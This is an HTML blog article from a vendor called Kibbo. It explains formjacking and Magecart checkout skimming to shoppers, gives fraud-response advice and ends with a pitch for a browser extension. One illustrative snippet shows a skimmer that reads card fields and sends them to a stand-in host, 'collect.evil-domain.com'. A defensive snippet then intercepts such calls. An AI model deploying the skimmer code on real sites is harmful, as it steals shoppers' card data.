@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<link rel="canonical" href="https://www.getkibbo.com/blog/checkout-intercept-formjacking-magecart">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>The Checkout Intercept: How Cybercriminals Steal Your Card Data Without Touching Your Phone — Kibbo</title>
+<meta name="description" content="Formjacking and Magecart attacks hit legitimate HTTPS sites every day. Here's how criminals steal your card data at checkout — and the script-level defense that stops them.">
+
+<!-- Open Graph -->
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Kibbo">
+<meta property="og:title" content="The Checkout Intercept: How Cybercriminals Steal Your Card Data Without Touching Your Phone">
+<meta property="og:description" content="The padlock icon doesn't mean your card is safe. Here's the JavaScript technique criminals use to clone your payment data on fully legitimate sites.">
+<meta property="og:url" content="https://www.getkibbo.com/blog/checkout-intercept-formjacking-magecart">
+<meta property="og:image" content="https://www.getkibbo.com/images/products/checkout-security-shield.png">
+<meta property="article:published_time" content="2026-06-26">
+<meta property="article:tag" content="consumer protection, security, javascript, ecommerce">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="The Checkout Intercept: How Cybercriminals Steal Your Card Data Without Touching Your Phone">
+<meta name="twitter:description" content="The padlock icon doesn't mean your card is safe. Here's the JavaScript technique criminals use to clone your payment data on fully legitimate sites.">
+<meta name="twitter:image" content="https://www.getkibbo.com/images/products/checkout-security-shield.png">
+
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700;900&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+/* ===== RESET & BASE ===== */
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: 'Inter', system-ui, sans-serif; font-weight: 400;
+  background: #FFFFFF; color: #0A0A0A; overflow-x: hidden; -webkit-font-smoothing: antialiased;
+}
+
+/* ===== NAV ===== */
+nav {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 100; height: 60px;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 40px; background: #FFFFFF; border-bottom: 2px solid #0A0A0A;
+}
+.nav-logo { display: flex; align-items: center; gap: 8px; text-decoration: none; }
+.nav-logo-text { font-family: 'Space Grotesk', sans-serif; font-weight: 900; font-size: 20px; color: #0A0A0A; letter-spacing: -0.5px; }
+.nav-links { display: flex; align-items: center; gap: 0; list-style: none; }
+.nav-links a { font-family: 'Inter', sans-serif; font-size: 14px; font-weight: 500; color: #0A0A0A; text-decoration: none; padding: 6px 16px; transition: background 0.1s; }
+.nav-links a:hover, .nav-links a.active { background: #FFE500; }
+.nav-hamburger { display: none; flex-direction: column; gap: 5px; cursor: pointer; background: none; border: none; padding: 4px; }
+.nav-hamburger span { display: block; width: 24px; height: 2px; background: #0A0A0A; }
+.nav-mobile-menu { display: none; position: fixed; top: 60px; left: 0; right: 0; background: #FFFFFF; border-bottom: 2px solid #0A0A0A; z-index: 99; padding: 16px 24px 20px; flex-direction: column; gap: 4px; }
+.nav-mobile-menu.open { display: flex; }
+.nav-mobile-menu a { font-family: 'Inter', sans-serif; font-size: 16px; font-weight: 500; color: #0A0A0A; text-decoration: none; padding: 10px 0; border-bottom: 1px solid #e0e0e0; }
+.nav-mobile-menu a:last-child { border-bottom: none; }
+
+/* ===== POST HEAD ===== */
+.post-head { background: #FFE500; border-bottom: 3px solid #0A0A0A; padding: 120px 40px 56px; }
+.post-head-inner { max-width: 720px; margin: 0 auto; }
+.breadcrumb { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 22px; }
+.breadcrumb a { color: #0A0A0A; text-decoration: none; border-bottom: 2px solid #0A0A0A; padding-bottom: 1px; }
+.post-head time { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; color: #0A0A0A; }
+.author-line { display: flex; align-items: center; gap: 10px; margin: 18px 0 0; font-family: 'Inter', sans-serif; font-size: 15px; color: #0A0A0A; }
+.author-avatar { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; border: 2px solid #0A0A0A; display: block; flex-shrink: 0; }
+.author-line a { color: #0A0A0A; text-decoration: underline; text-decoration-thickness: 2px; text-underline-offset: 2px; text-decoration-color: rgba(10,10,10,0.4); }
+.post-h1 { font-family: 'Space Grotesk', sans-serif; font-weight: 900; font-size: clamp(32px, 6vw, 56px); line-height: 1.02; letter-spacing: -1.5px; margin: 14px 0 0; }
+
+/* ===== POST BODY ===== */
+.post-body {
+  max-width: 720px; margin: 0 auto; padding: 56px 40px 40px;
+  font-family: 'Inter', sans-serif; font-size: 18px; line-height: 1.7; color: #1a1a1a;
+}
+.post-body > p:first-child { font-size: 21px; line-height: 1.6; color: #0A0A0A; }
+.post-body h2 { font-family: 'Space Grotesk', sans-serif; font-weight: 900; font-size: 30px; line-height: 1.15; letter-spacing: -0.5px; margin: 48px 0 16px; }
+.post-body h3 { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 22px; line-height: 1.2; margin: 32px 0 12px; }
+.post-body p { margin-bottom: 20px; }
+.post-body ul, .post-body ol { margin: 0 0 22px 24px; }
+.post-body li { margin-bottom: 8px; }
+.post-body a { color: #0A0A0A; text-decoration: underline; text-decoration-thickness: 2px; text-underline-offset: 2px; text-decoration-color: #FFE500; }
+.post-body strong { font-weight: 700; }
+.post-body code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background: #F0F0F0; padding: 2px 6px; border-radius: 3px; font-size: 0.88em; }
+.post-body pre { background: #0A0A0A; color: #f5f5f5; padding: 22px; border-radius: 4px; overflow-x: auto; border: 2px solid #0A0A0A; box-shadow: 4px 4px 0px #FFE500; margin: 0 0 26px; }
+.post-body pre code { background: none; color: inherit; padding: 0; font-size: 14px; line-height: 1.6; }
+.post-body blockquote { border-left: 4px solid #FFE500; padding-left: 18px; margin: 0 0 24px; color: #444; font-style: italic; }
+.post-body img { max-width: 100%; height: auto; border: 2px solid #0A0A0A; border-radius: 2px; display: block; margin: 0 0 26px; }
+
+/* ===== CTA ===== */
+.post-cta { max-width: 720px; margin: 16px auto 100px; padding: 0 40px; }
+.post-cta-inner { background: #0A0A0A; border: 2px solid #0A0A0A; border-radius: 2px; box-shadow: 6px 6px 0px #FFE500; padding: 38px 34px; }
+.post-cta-tag { display: inline-block; background: #FFE500; color: #0A0A0A; font-family: 'Space Grotesk', sans-serif; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 2px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 16px; }
+.post-cta h2 { font-family: 'Space Grotesk', sans-serif; font-weight: 900; font-size: 26px; line-height: 1.15; letter-spacing: -0.5px; color: #FFFFFF; margin-bottom: 10px; }
+.post-cta p { font-family: 'Inter', sans-serif; font-size: 16px; line-height: 1.6; color: rgba(255,255,255,0.7); margin-bottom: 22px; }
+.post-cta p strong { color: #FFFFFF; }
+.post-cta-btn { display: inline-flex; align-items: center; gap: 6px; padding: 13px 22px; background: #FFE500; color: #0A0A0A; font-family: 'Space Grotesk', sans-serif; font-size: 14px; font-weight: 700; text-decoration: none; border: 2px solid #FFE500; border-radius: 2px; transition: transform 0.1s, box-shadow 0.1s; box-shadow: 3px 3px 0px rgba(255,229,0,0.3); }
+.post-cta-btn:hover { transform: translate(2px, 2px); box-shadow: 1px 1px 0px rgba(255,229,0,0.3); }
+
+/* ===== FOOTER ===== */
+footer { background: #0A0A0A; padding: 32px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
+.footer-logo { font-family: 'Space Grotesk', sans-serif; font-weight: 900; font-size: 20px; color: #FFFFFF; letter-spacing: -0.5px; }
+.footer-links { display: flex; align-items: center; gap: 24px; flex-wrap: wrap; }
+.footer-links a { font-family: 'Inter', sans-serif; font-size: 13px; font-weight: 400; color: rgba(255,255,255,0.55); text-decoration: none; transition: color 0.1s; }
+.footer-links a:hover { color: #FFE500; }
+.footer-copy { font-family: 'Inter', sans-serif; font-size: 12px; color: rgba(255,255,255,0.4); width: 100%; text-align: center; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 16px; margin-top: 4px; }
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 900px) {
+  nav { padding: 0 20px; }
+  .nav-links { display: none; }
+  .nav-hamburger { display: flex; }
+  .post-head { padding: 100px 20px 44px; }
+  .post-body { padding: 40px 20px 32px; font-size: 17px; }
+  .post-cta { padding: 0 20px; }
+  footer { padding: 24px 20px; flex-direction: column; align-items: flex-start; }
+  .footer-logo { margin-bottom: 12px; }
+}
+</style>
+
+<!-- BlogPosting + Breadcrumb -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://www.getkibbo.com/" },
+        { "@type": "ListItem", "position": 2, "name": "Blog", "item": "https://www.getkibbo.com/blog" },
+        { "@type": "ListItem", "position": 3, "name": "The Checkout Intercept: How Cybercriminals Steal Your Card Data Without Touching Your Phone", "item": "https://www.getkibbo.com/blog/checkout-intercept-formjacking-magecart" }
+      ]
+    },
+    {
+      "@type": "BlogPosting",
+      "@id": "https://www.getkibbo.com/blog/checkout-intercept-formjacking-magecart#article",
+      "mainEntityOfPage": { "@type": "WebPage", "@id": "https://www.getkibbo.com/blog/checkout-intercept-formjacking-magecart" },
+      "headline": "The Checkout Intercept: How Cybercriminals Steal Your Card Data Without Touching Your Phone",
+      "description": "Formjacking and Magecart attacks hit legitimate HTTPS sites every day. Here's how criminals steal your card data at checkout — and the script-level defense that stops them.",
+      "image": "https://www.getkibbo.com/images/products/checkout-security-shield.png",
+      "datePublished": "2026-06-26T00:00:00Z",
+      "dateModified": "2026-06-26T00:00:00Z",
+      "author": { "@type": "Person", "name": "Margaret Spencer Breen", "url": "https://www.getkibbo.com/about" },
+      "publisher": { "@type": "Organization", "name": "Kibbo", "url": "https://www.getkibbo.com/", "logo": { "@type": "ImageObject", "url": "https://www.getkibbo.com/favicon.png" } },
+      "keywords": "consumer protection, security, javascript, ecommerce, formjacking, Magecart, checkout security",
+      "inLanguage": "en",
+      "url": "https://www.getkibbo.com/blog/checkout-intercept-formjacking-magecart"
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a href="/" class="nav-logo"><span class="nav-logo-text">KIBBO</span></a>
+  <ul class="nav-links">
+    <li><a href="/#products">Products</a></li>
+    <li><a href="/blog.html" class="active">Blog</a></li>
+    <li><a href="/#contact">Contact</a></li>
+  </ul>
+  <button class="nav-hamburger" id="hamburger" aria-label="Open menu">
+    <span></span><span></span><span></span>
+  </button>
+</nav>
+
+<!-- MOBILE MENU -->
+<div class="nav-mobile-menu" id="mobileMenu">
+  <a href="/#products">Products</a>
+  <a href="/blog.html">Blog</a>
+  <a href="/#contact">Contact</a>
+</div>
+
+<!-- ARTICLE -->
+<article>
+  <header class="post-head">
+    <div class="post-head-inner">
+      <nav class="breadcrumb" aria-label="Breadcrumb"><a href="/blog.html">← Blog</a></nav>
+      <time datetime="2026-06-26">June 26, 2026</time>
+      <div class="author-line">
+        <img src="../images/authors/margaret-spencer-breen.jpg" alt="Margaret Spencer Breen" class="author-avatar" />
+        <span>By <a href="https://www.getkibbo.com/about.html">Margaret Spencer Breen</a></span>
+      </div>
+      <h1 class="post-h1">The Checkout Intercept: How Cybercriminals Steal Your Card Data Without Touching Your Phone</h1>
+    </div>
+  </header>
+
+  <div class="post-body">
+    <p>The padlock icon in your browser's address bar does not mean your card is safe. That's the assumption most online shoppers carry — quietly, confidently — every time they type sixteen digits into a checkout form. It's also the assumption that a highly organised class of cybercriminals has spent the last decade building their entire business model around.</p>
+
+    <p>The <a href="https://www.ftc.gov/news-events/press-releases/2026/06/ftc-data-show-people-reported-losing-3-point-5-billion-imposter-scams-2025" target="_blank" rel="noopener">FTC's most recent consumer fraud report</a> puts total losses to fraud at $15.9 billion, with credit cards as the most frequently reported payment method in those filings. The <a href="https://www.fbi.gov/news/press-releases/cryptocurrency-and-ai-scams-bilk-americans-of-billions" target="_blank" rel="noopener">FBI's Internet Crime Complaint Center</a> processes roughly 3,000 cybercrime complaints every single day. Those numbers don't come from sketchy websites with broken layouts and misspelled domain names. A significant portion of them come from completely normal purchases on completely legitimate stores.</p>
+
+    <p>The technique responsible for a large share of that damage is called formjacking — also referred to as a Magecart attack when it involves organised criminal groups. Understanding how it works is the first step to not becoming one of those statistics.</p>
+
+    <h2>How your card gets cloned without anyone touching your device</h2>
+
+    <p>Formjacking doesn't require physical access to your phone or computer. It doesn't require a fake website. It doesn't even require you to click a suspicious link. The attack happens on the server side — specifically, inside the JavaScript that a legitimate retailer loads on its own checkout page.</p>
+
+    <p>Here's what the attack looks like in simplified form:</p>
+
+    <pre><code>// Malicious script injected into the retailer's checkout page
+// Runs silently alongside the store's legitimate payment code
+
+document.addEventListener('submit', function(e) {
+  const form = e.target;
+  const cardData = {
+    number: form.querySelector('[name="card_number"]').value,
+    expiry: form.querySelector('[name="expiry"]').value,
+    cvv:    form.querySelector('[name="cvv"]').value,
+    name:   form.querySelector('[name="card_name"]').value
+  };
+
+  // Exfiltrate to attacker's server before the form submits
+  navigator.sendBeacon('https://collect.evil-domain.com/c',
+    JSON.stringify(cardData)
+  );
+
+  // Allow normal submission to continue — store processes your order
+  // You receive your confirmation email. Nothing looks wrong.
+});</code></pre>
+
+    <p>The store processes your order. Your bank approves the charge. Your confirmation email arrives. The malicious script runs in the same fraction of a second, clones your card data, and sends it to a remote server you'll never know existed. You won't notice anything until fraudulent charges appear on your statement — sometimes days later, sometimes weeks.</p>
+
+    <p><a href="https://www.cisa.gov/news-events/news/handling-e-commerce-skimming-attacks" target="_blank" rel="noopener">CISA's guidance on e-commerce skimming attacks</a> documents how these injections typically reach legitimate stores: through compromised third-party plugins, outdated payment modules, or direct breaches of the retailer's own infrastructure. The store doesn't know the script is there. Their HTTPS certificate is valid. Their padlock is real. None of that protects your card data if the JavaScript running on the page has been tampered with.</p>
+
+    <h2>Three warning signs at checkout that most people ignore</h2>
+
+    <p>Formjacking is designed to be invisible, and in most cases it succeeds completely. But there are patterns that show up often enough to be worth knowing.</p>
+
+    <p>The first is an unexpected redirect at the payment stage. You're navigating a well-designed store, reach checkout, and get sent to an unbranded or generic-looking payment page that doesn't share the original site's visual style. Legitimate payment processors do sometimes redirect — Stripe, PayPal, and others use hosted payment pages — but you should be able to verify the destination URL is the processor's own domain, not something assembled to look like one.</p>
+
+    <p>The second is unusual form fields. A standard card transaction needs your card number, expiry date, CVV, and billing postcode. Nothing else. If a checkout form asks for your ATM PIN, social security number, or mother's maiden name, stop. No legitimate payment processor needs that information at point of sale.</p>
+
+    <p>The third is a subtle timing issue: payment fields that flicker, lag, or render noticeably later than the rest of the page. This can happen when a rogue script loads after the page's main content and overwrites or duplicates the form fields it's targeting. It's not definitive — slow third-party scripts cause the same symptom legitimately — but it's worth noticing.</p>
+
+    <h2>Why your antivirus doesn't catch this</h2>
+
+    <p>Standard security software scans your device for local threats: files, executables, downloads. Formjacking doesn't involve any of those. The malicious code lives on the retailer's server and executes inside your browser as trusted JavaScript — because from your browser's perspective, it arrived from the same domain as the rest of the page.</p>
+
+    <p>Your browser has no built-in mechanism to distinguish between JavaScript the retailer intentionally loaded and JavaScript an attacker inserted into the retailer's codebase three weeks ago. The HTTPS connection just means the data in transit is encrypted. It says nothing about what the JavaScript on the page is doing with that data before it gets sent anywhere.</p>
+
+    <p>Detecting this class of attack requires monitoring what scripts are actually doing at runtime — specifically, whether any script is reading form field values and sending them to a domain that isn't the legitimate payment processor. That's a script-level problem and needs a script-level defense.</p>
+
+    <pre><code>// What a checkout security extension monitors
+function auditCheckoutScripts() {
+  const scripts = performance.getEntriesByType('resource')
+    .filter(r =&gt; r.initiatorType === 'script');
+
+  // Flag any script domains not in the known-safe payment processor list
+  const TRUSTED_DOMAINS = [
+    'js.stripe.com',
+    'www.paypalobjects.com',
+    'checkout.square.site',
+    'secure.checkout.visa.com'
+  ];
+
+  return scripts.filter(s =&gt; {
+    const domain = new URL(s.name).hostname;
+    return !TRUSTED_DOMAINS.some(d =&gt; domain.endsWith(d));
+  });
+}
+
+// Watch for beacon/fetch calls from untrusted origins during form submission
+const originalSendBeacon = navigator.sendBeacon.bind(navigator);
+navigator.sendBeacon = function(url, data) {
+  if (!isTrustedPaymentEndpoint(url)) {
+    console.warn('[Shield] Suspicious beacon detected:', url);
+    return false; // Block exfiltration attempt
+  }
+  return originalSendBeacon(url, data);
+};</code></pre>
+
+    <p>This is roughly the logic behind what a checkout security extension does at the script level. It doesn't inspect your card number — it watches whether anything else on the page is trying to.</p>
+
+    <h2>If it's already happened: what to do in the right order</h2>
+
+    <p>Fraudulent charges from formjacking often appear days or weeks after the original purchase, which means most people don't immediately connect them to a specific transaction. If you spot unauthorised charges and suspect checkout fraud, the sequence matters.</p>
+
+    <p>First, lock the card immediately through your bank's mobile app — don't wait on hold to speak to someone. Locking halts any pending authorisations while you investigate. Cancelling and reissuing comes after.</p>
+
+    <p>Second, file a report with the relevant authority before you dispute with your bank. In the US, that's <a href="https://reportfraud.ftc.gov" target="_blank" rel="noopener">reportfraud.ftc.gov</a>. In the UK, Action Fraud at actionfraud.police.uk. The report creates a paper trail that strengthens your dispute case.</p>
+
+    <p>Third, use the word "chargeback" explicitly when you call your bank. Under the Fair Credit Billing Act in the US, your liability for unauthorised credit card charges is capped at $50 — and in practice most major card issuers set it at zero for fraud cases filed promptly. The word chargeback tells the fraud team which process to open; "I want to dispute a charge" can route you somewhere slower.</p>
+
+    <p>Keep a record of every communication — dates, reference numbers, names. Banks resolve most of these in your favour when the documentation is clean.</p>
+
+    <h2>The structural problem with checkout security</h2>
+
+    <p>The deeper issue is that the responsibility for detecting compromised scripts currently sits entirely with the retailer. As a consumer, you have no visibility into the third-party code running on a checkout page. You can't see whether the payment form you're filling in has been modified since the retailer last audited it. You're trusting an infrastructure you can't inspect.</p>
+
+    <p>The padlock tells you the connection is encrypted. It tells you nothing about the destination of your data once it's been read by the scripts on the page. Those are two different things, and the entire formjacking industry exists in the gap between them.</p>
+
+    <p>Moving that monitoring to the browser side — where the consumer has control — is the only way to close that gap without depending on every retailer's security practices being perfect. Which, given that the FTC is processing $15.9 billion in annual fraud losses, they clearly are not.</p>
+  </div>
+</article>
+
+<!-- CTA -->
+<aside class="post-cta">
+  <div class="post-cta-inner">
+    <span class="post-cta-tag">Get the tool</span>
+    <h2>Checkout Security Shield</h2>
+    <p>A browser extension that monitors checkout pages for rogue scripts, unverified payment endpoints, and form field interception — in real time, before you hit submit.</p>
+    <p><strong>For shoppers:</strong> <a class="post-cta-btn" href="https://carlosdevlop.gumroad.com/l/checkout-security-shield" target="_blank" rel="noopener">Get it on Gumroad →</a></p>
+    <p><strong>For developers:</strong> Building transactional platforms or point-of-sale tools? The full source code — script auditor, beacon interceptor, and form integrity checker — is available for commercial use.</p>
+    <p><a class="post-cta-btn" href="https://carlosdevlop.gumroad.com/l/checkout-security-shield" target="_blank" rel="noopener">Get the source code ($19) →</a></p>
+  </div>
+</aside>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-logo">KIBBO</div>
+  <div class="footer-links">
+    <a href="https://github.com/Sevillanitto" target="_blank" rel="noopener">GitHub</a>
+    <a href="mailto:hello@getkibbo.com">Contact</a>
+  </div>
+  <div class="footer-copy">© 2026 · Built by an independent developer</div>
+</footer>
+
+<script>
+(function() {
+  var btn = document.getElementById('hamburger');
+  var menu = document.getElementById('mobileMenu');
+  if (!btn || !menu) return;
+  btn.addEventListener('click', function() { menu.classList.toggle('open'); });
+  menu.querySelectorAll('a').forEach(function(a) {
+    a.addEventListener('click', function() { menu.classList.remove('open'); });
+  });
+})();
+</script>
+</body>
+</html>
